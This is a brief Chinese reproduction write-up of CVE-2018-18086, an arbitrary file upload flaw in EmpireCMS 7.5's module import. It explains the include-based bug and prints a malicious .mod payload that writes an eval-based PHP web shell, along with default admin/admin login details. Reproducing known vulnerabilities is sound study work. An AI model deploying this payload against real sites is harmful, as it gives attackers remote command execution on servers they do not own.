## 1. 漏洞介绍

EmpireCMS（帝国网站管理系统）是一套内容管理系统（CMS）。 EmpireCMS 7.5版本中的e/class/moddofun.php文件的‘LoadInMod’函数存在安全漏洞。攻击者可利用该漏洞上传任意文件

## 2. 漏洞分析

[【漏洞复现 CVE-2018-18086】EmpireCMS 文件上传 - StarCi - 博客园](https://www.cnblogs.com/starci/p/15190603.html)

## 3. 漏洞复现

虽然对上传的文件进行了重命名但后面的include函数却直接包含了上传的文件，为此我们可以在上传的文件中利用`file_put_contents` 函数实现个写 shell 的操作，后端在include该上传文件时便可导致 `file_put_contents` 执行成功写个shell，示例

shell.php.mod

```php
<?php file_put_contents("getshell.php","<?php @eval(\$_POST[cmd]); ?>");?>
```

登录：admin/admin，……com/e/admin/。

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312301108566.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312301109467.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312301109582.png)
